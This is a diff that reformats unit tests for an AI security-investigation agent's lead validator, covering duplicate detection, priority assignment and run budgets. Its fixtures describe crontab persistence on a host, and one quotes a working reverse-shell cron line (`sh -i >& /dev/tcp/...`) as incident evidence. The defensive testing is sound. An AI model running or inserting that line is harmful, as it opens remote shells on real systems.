@@ -9,6 +9,7 @@ stub the model so no real LLM is needed.
 Run from project root with:
     python -m pytest tests/unit/graph/test_lead_model.py
 """
+
 from __future__ import annotations
 
 import json
@@ -17,7 +18,9 @@ import sys
 import tempfile
 import unittest
 
-project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
+project_root = os.path.dirname(
+    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+)
 sys.path.insert(0, project_root)
 os.environ.setdefault("DJANGO_SETTINGS_MODULE", "aci.settings")
 os.environ["SECRET_KEY"] = "test"
@@ -25,6 +28,7 @@ os.environ["TASKQUEUE_DB_PATH"] = tempfile.mktemp(suffix=".db")
 os.environ["BOARD_DB_PATH"] = tempfile.mktemp(suffix=".db")
 
 import django
+
 django.setup()
 
 from langchain_core.messages import AIMessage
@@ -39,6 +43,7 @@ from agent.runtime.graph.leads import (
 
 class StubModel:
     """Records the prompt it received and returns a canned response."""
+
     def __init__(self, response: str):
         self._response = response
         self.last_prompt = ""
@@ -60,15 +65,19 @@ MISFORMATTED_SECTION = """
   - priority: 65
 """
 
-GOOD_RESPONSE = json.dumps([{
-    "title": "Extract exact crontab diff/content around nano save",
-    "pivots": "host kali, user user, 2025-04-20T03:47Z-03:55Z, /var/spool/cron/crontabs/user",
-    "evidence": "SIEM shows nano + sudo activity around the crontab path with syscheck add/delete",
-    "priority": 65,
-    "approved": True,
-    "category": "approved",
-    "reason": "concrete pivots and evidence anchor",
-}])
+GOOD_RESPONSE = json.dumps(
+    [
+        {
+            "title": "Extract exact crontab diff/content around nano save",
+            "pivots": "host kali, user user, 2025-04-20T03:47Z-03:55Z, /var/spool/cron/crontabs/user",
+            "evidence": "SIEM shows nano + sudo activity around the crontab path with syscheck add/delete",
+            "priority": 65,
+            "approved": True,
+            "category": "approved",
+            "reason": "concrete pivots and evidence anchor",
+        }
+    ]
+)
 
 
 class LeadModelTests(unittest.IsolatedAsyncioTestCase):
@@ -91,45 +100,60 @@ class LeadModelTests(unittest.IsolatedAsyncioTestCase):
         self.assertTrue(cand.evidence)
 
     async def test_reviewer_gets_queue_priorities_and_assigns_final_priority(self):
-        response = json.dumps([{
-            "title": "Check lower-value scope around 10.0.2.5",
-            "pivots": "ip=10.0.2.5",
-            "evidence": "callback destination already confirmed",
-            "priority": 45,
-            "approved": True,
-            "category": "approved",
-            "reason": "valid but ranks below queued containment work",
-        }])
+        response = json.dumps(
+            [
+                {
+                    "title": "Check lower-value scope around 10.0.2.5",
+                    "pivots": "ip=10.0.2.5",
+                    "evidence": "callback destination already confirmed",
+                    "priority": 45,
+                    "approved": True,
+                    "category": "approved",
+                    "reason": "valid but ranks below queued containment work",
+                }
+            ]
+        )
         model = StubModel(response)
         result = await validate_leads_model(
             model,
             leads_section="- Check lower-value scope around 10.0.2.5\n  priority: 80",
             final_answer="## Findings\n- Callback destination 10.0.2.5 was confirmed.",
-            existing_tasks=[{
-                "title": "Contain active reverse shell on kali",
-                "description": "Pivots: host=kali callback=10.0.2.5",
-                "priority": 95,
-                "status": "pending",
-            }],
+            existing_tasks=[
+                {
+                    "title": "Contain active reverse shell on kali",
+                    "description": "Pivots: host=kali callback=10.0.2.5",
+                    "priority": 95,
+                    "status": "pending",
+                }
+            ],
             current_task={"title": "Confirm callback", "description": "ip=10.0.2.5"},
             remaining_run_budget=3,
             agent_name="investigation",
         )
-        self.assertIn("[pending P95] Contain active reverse shell on kali", model.last_prompt)
-        self.assertIn("Priority assignment happens AFTER reading the current queue", model.last_prompt)
+        self.assertIn(
+            "[pending P95] Contain active reverse shell on kali", model.last_prompt
+        )
+        self.assertIn(
+            "Priority assignment happens AFTER reading the current queue",
+            model.last_prompt,
+        )
         self.assertEqual(len(result.approved), 1)
         self.assertEqual(result.approved[0].candidate.priority, 45)
 
     async def test_low_priority_valid_lead_is_not_rejected_for_priority(self):
-        response = json.dumps([{
-            "title": "Record administrative cleanup follow-up for known callback",
-            "pivots": "ip=10.0.2.5",
-            "evidence": "callback destination already confirmed",
-            "priority": 35,
-            "approved": True,
-            "category": "approved",
-            "reason": "low priority but evidence-backed",
-        }])
+        response = json.dumps(
+            [
+                {
+                    "title": "Record administrative cleanup follow-up for known callback",
+                    "pivots": "ip=10.0.2.5",
+                    "evidence": "callback destination already confirmed",
+                    "priority": 35,
+                    "approved": True,
+                    "category": "approved",
+                    "reason": "low priority but evidence-backed",
+                }
+            ]
+        )
         result = await validate_leads_model(
             StubModel(response),
             leads_section="- Record administrative cleanup follow-up for known callback\n  priority: 35",
@@ -171,26 +195,35 @@ class LeadModelTests(unittest.IsolatedAsyncioTestCase):
 
     async def test_duplicate_backstop_overrides_model_approval(self):
         # Model approves, but the lead duplicates a queued task by path artifact.
-        existing = [{
-            "title": "Review crontab contents for /var/spool/cron/crontabs/user",
-            "description": "Pivots: path=/var/spool/cron/crontabs/user, host=kali",
-            "status": "pending",
-        }]
-        response = json.dumps([{
-            "title": "Inspect crontab persistence",
-            "pivots": "path=/var/spool/cron/crontabs/user, host=kali",
-            "evidence": "syscheck add/delete on /var/spool/cron/crontabs/user",
-            "priority": 80,
-            "approved": True,
-            "category": "approved",
-            "reason": "looks new",
-        }])
+        existing = [
+            {
+                "title": "Review crontab contents for /var/spool/cron/crontabs/user",
+                "description": "Pivots: path=/var/spool/cron/crontabs/user, host=kali",
+                "status": "pending",
+            }
+        ]
+        response = json.dumps(
+            [
+                {
+                    "title": "Inspect crontab persistence",
+                    "pivots": "path=/var/spool/cron/crontabs/user, host=kali",
+                    "evidence": "syscheck add/delete on /var/spool/cron/crontabs/user",
+                    "priority": 80,
+                    "approved": True,
+                    "category": "approved",
+                    "reason": "looks new",
+                }
+            ]
+        )
         result = await validate_leads_model(
             StubModel(response),
             leads_section="- something",
             final_answer="",
             existing_tasks=existing,
-            current_task={"title": "Cron review", "description": "path=/var/spool/cron/crontabs/user"},
+            current_task={
+                "title": "Cron review",
+                "description": "path=/var/spool/cron/crontabs/user",
+            },
             remaining_run_budget=3,
             agent_name="investigation",
         )
@@ -198,15 +231,18 @@ class LeadModelTests(unittest.IsolatedAsyncioTestCase):
         self.assertEqual(result.rejected[0].category, "duplicate")
 
     async def test_budget_cap_defers_surplus(self):
-        leads = [{
-            "title": f"Investigate callback {i}",
-            "pivots": f"ip=10.0.0.{i}",
-            "evidence": f"event=evt-{i}",
-            "priority": 90 - i,
-            "approved": True,
-            "category": "approved",
-            "reason": "callback",
-        } for i in range(3)]
+        leads = [
+            {
+                "title": f"Investigate callback {i}",
+                "pivots": f"ip=10.0.0.{i}",
+                "evidence": f"event=evt-{i}",
+                "priority": 90 - i,
+                "approved": True,
+                "category": "approved",
+                "reason": "callback",
+            }
+            for i in range(3)
+        ]
         result = await validate_leads_model(
             StubModel(json.dumps(leads)),
             leads_section="- leads",
@@ -222,22 +258,28 @@ class LeadModelTests(unittest.IsolatedAsyncioTestCase):
     async def test_spawns_both_backward_and_forward_leads(self):
         # Report whose Open Gaps name an initial-access (backward) gap and a
         # C2-confirmation (forward) gap. Both directions must be approved.
-        leads = json.dumps([
-            {
-                "title": "Identify initial access source IP for the first login",
-                "pivots": "host kali, user user, earliest session before 03:47Z",
-                "evidence": "Open Gaps: initial access source IP missing from telemetry",
-                "priority": 80, "approved": True, "category": "approved",
-                "reason": "backward / root cause",
-            },
-            {
-                "title": "Confirm C2 callback network connection to 10.0.2.5:5555",
-                "pivots": "ip=10.0.2.5, port=5555",
-                "evidence": "Open Gaps: network-level callback success unconfirmed",
-                "priority": 78, "approved": True, "category": "approved",
-                "reason": "forward / impact",
-            },
-        ])
+        leads = json.dumps(
+            [
+                {
+                    "title": "Identify initial access source IP for the first login",
+                    "pivots": "host kali, user user, earliest session before 03:47Z",
+                    "evidence": "Open Gaps: initial access source IP missing from telemetry",
+                    "priority": 80,
+                    "approved": True,
+                    "category": "approved",
+                    "reason": "backward / root cause",
+                },
+                {
+                    "title": "Confirm C2 callback network connection to 10.0.2.5:5555",
+                    "pivots": "ip=10.0.2.5, port=5555",
+                    "evidence": "Open Gaps: network-level callback success unconfirmed",
+                    "priority": 78,
+                    "approved": True,
+                    "category": "approved",
+                    "reason": "forward / impact",
+                },
+            ]
+        )
         result = await validate_leads_model(
             StubModel(leads),
             leads_section="- leads",
@@ -254,19 +296,27 @@ class LeadModelTests(unittest.IsolatedAsyncioTestCase):
     async def test_duplicate_of_completed_task_is_rejected(self):
         # A completed task with a firm conclusion should still block a
         # signature-identical lead.
-        existing = [{
-            "title": "Review crontab contents for /var/spool/cron/crontabs/user",
-            "description": "Pivots: path=/var/spool/cron/crontabs/user, host=kali",
-            "status": "completed",
-            "summary": "## Findings\n- Confirmed the crontab diff inserted a reverse shell and fully answered the question.\n## New Leads\n- None.",
-        }]
-        response = json.dumps([{
-            "title": "Inspect crontab persistence",
-            "pivots": "path=/var/spool/cron/crontabs/user, host=kali",
-            "evidence": "syscheck add/delete on /var/spool/cron/crontabs/user",
-            "priority": 80, "approved": True, "category": "approved",
-            "reason": "model thinks it is new",
-        }])
+        existing = [
+            {
+                "title": "Review crontab contents for /var/spool/cron/crontabs/user",
+                "description": "Pivots: path=/var/spool/cron/crontabs/user, host=kali",
+                "status": "completed",
+                "summary": "## Findings\n- Confirmed the crontab diff inserted a reverse shell and fully answered the question.\n## New Leads\n- None.",
+            }
+        ]
+        response = json.dumps(
+            [
+                {
+                    "title": "Inspect crontab persistence",
+                    "pivots": "path=/var/spool/cron/crontabs/user, host=kali",
+                    "evidence": "syscheck add/delete on /var/spool/cron/crontabs/user",
+                    "priority": 80,
+                    "approved": True,
+                    "category": "approved",
+                    "reason": "model thinks it is new",
+                }
+            ]
+        )
         result = await validate_leads_model(
             StubModel(response),
             leads_section="- lead",
@@ -282,18 +332,26 @@ class LeadModelTests(unittest.IsolatedAsyncioTestCase):
     async def test_active_task_title_similarity_blocks_duplicate(self):
         # A pending task already investigating essentially the same question
         # should block a semantically overlapping lead.
-        existing = [{
-            "title": "Verify whether any outbound connections or reverse-shell commands occurred after cron editing",
-            "description": "Pivots: host=kali, crontab=/var/spool/cron/crontabs/user",
-            "status": "pending",
-        }]
-        response = json.dumps([{
-            "title": "Verify any outbound reverse-shell callback or live C2 session to 10.0.2.5:5555",
-            "pivots": "ip=10.0.2.5, port=5555, time=2025-04-20T03:54:37Z",
-            "evidence": "cron job `sh -i >& /dev/tcp/10.0.2.5/5555 0>&1` found in crontab",
-            "priority": 80, "approved": True, "category": "approved",
-            "reason": "model thinks it is a new angle",
-        }])
+        existing = [
+            {
+                "title": "Verify whether any outbound connections or reverse-shell commands occurred after cron editing",
+                "description": "Pivots: host=kali, crontab=/var/spool/cron/crontabs/user",
+                "status": "pending",
+            }
+        ]
+        response = json.dumps(
+            [
+                {
+                    "title": "Verify any outbound reverse-shell callback or live C2 session to 10.0.2.5:5555",
+                    "pivots": "ip=10.0.2.5, port=5555, time=2025-04-20T03:54:37Z",
+                    "evidence": "cron job `sh -i >& /dev/tcp/10.0.2.5/5555 0>&1` found in crontab",
+                    "priority": 80,
+                    "approved": True,
+                    "category": "approved",
+                    "reason": "model thinks it is a new angle",
+                }
+            ]
+        )
         result = await validate_leads_model(
             StubModel(response),
             leads_section="- lead",
@@ -307,18 +365,26 @@ class LeadModelTests(unittest.IsolatedAsyncioTestCase):
         self.assertEqual(result.rejected[0].category, "duplicate")
 
     async def test_active_task_without_semantic_overlap_does_not_block(self):
-        existing = [{
-            "title": "Identify the source IP of the earliest suspicious login",
-            "description": "Pivots: host=kali, auth logs, ssh sessions",
-            "status": "pending",
-        }]
-        response = json.dumps([{
-            "title": "Verify crontab contents changed during the nano session",
-            "pivots": "host=kali, /tmp/crontab.Tgi9hP/crontab",
-            "evidence": "nano edited temp crontab path",
-            "priority": 80, "approved": True, "category": "approved",
-            "reason": "different investigative question",
-        }])
+        existing = [
+            {
+                "title": "Identify the source IP of the earliest suspicious login",
+                "description": "Pivots: host=kali, auth logs, ssh sessions",
+                "status": "pending",
+            }
+        ]
+        response = json.dumps(
+            [
+                {
+                    "title": "Verify crontab contents changed during the nano session",
+                    "pivots": "host=kali, /tmp/crontab.Tgi9hP/crontab",
+                    "evidence": "nano edited temp crontab path",
+                    "priority": 80,
+                    "approved": True,
+                    "category": "approved",
+                    "reason": "different investigative question",
+                }
+            ]
+        )
         result = await validate_leads_model(
             StubModel(response),
             leads_section="- lead",
@@ -332,24 +398,32 @@ class LeadModelTests(unittest.IsolatedAsyncioTestCase):
         self.assertEqual(len(result.rejected), 0)
 
     async def test_inconclusive_completed_task_does_not_block_duplicate_lead(self):
-        existing = [{
-            "title": "Investigate whether the attacker performed lateral movement or data access from kali after persistence",
-            "description": "Pivots: host=kali, callback=10.0.2.5:5555",
-            "status": "completed",
-            "summary": (
-                "## Findings\n"
-                "- Lateral movement and data access are not confirmed by the events retrieved in this task.\n"
-                "## Hypotheses\n"
-                "- [Open] Additional post-exploitation actions may have occurred outside the retrieved window."
-            ),
-        }]
-        response = json.dumps([{
-            "title": "Investigate whether the attacker performed lateral movement or data access from kali after persistence",
-            "pivots": "host=kali, callback=10.0.2.5:5555",
-            "evidence": "prior task remained open and did not confirm impact",
-            "priority": 80, "approved": True, "category": "approved",
-            "reason": "prior task was inconclusive",
-        }])
+        existing = [
+            {
+                "title": "Investigate whether the attacker performed lateral movement or data access from kali after persistence",
+                "description": "Pivots: host=kali, callback=10.0.2.5:5555",
+                "status": "completed",
+                "summary": (
+                    "## Findings\n"
+                    "- Lateral movement and data access are not confirmed by the events retrieved in this task.\n"
+                    "## Hypotheses\n"
+                    "- [Open] Additional post-exploitation actions may have occurred outside the retrieved window."
+                ),
+            }
+        ]
+        response = json.dumps(
+            [
+                {
+                    "title": "Investigate whether the attacker performed lateral movement or data access from kali after persistence",
+                    "pivots": "host=kali, callback=10.0.2.5:5555",
+                    "evidence": "prior task remained open and did not confirm impact",
+                    "priority": 80,
+                    "approved": True,
+                    "category": "approved",
+                    "reason": "prior task was inconclusive",
+                }
+            ]
+        )
         result = await validate_leads_model(
             StubModel(response),
             leads_section="- lead",
@@ -364,16 +438,24 @@ class LeadModelTests(unittest.IsolatedAsyncioTestCase):
 
 
 def _decision(objective: str, score: int, idx: int) -> LeadDecision:
-    cand = LeadCandidate(title=f"lead-{idx}", pivots="p", evidence="e", priority=score, original_index=idx)
-    return LeadDecision(cand, True, "approved", "approved", score, f"{objective}:sig-{idx}")
+    cand = LeadCandidate(
+        title=f"lead-{idx}",
+        pivots="p",
+        evidence="e",
+        priority=score,
+        original_index=idx,
+    )
+    return LeadDecision(
+        cand, True, "approved", "approved", score, f"{objective}:sig-{idx}"
+    )
 
 
 class LeadBudgetDirectionTests(unittest.TestCase):
     def test_unlimited_budget_preserves_score_order(self):
         pool = [
-            _decision("c2_callback", 95, 0),       # forward, high
+            _decision("c2_callback", 95, 0),  # forward, high
             _decision("lateral_movement", 90, 1),  # forward, high
-            _decision("initial_access", 40, 2),     # backward, low
+            _decision("initial_access", 40, 2),  # backward, low
         ]
         approved, deferred = apply_lead_budget(pool, remaining_run_budget=2)
         self.assertEqual([d.score for d in approved], [95, 90, 40])
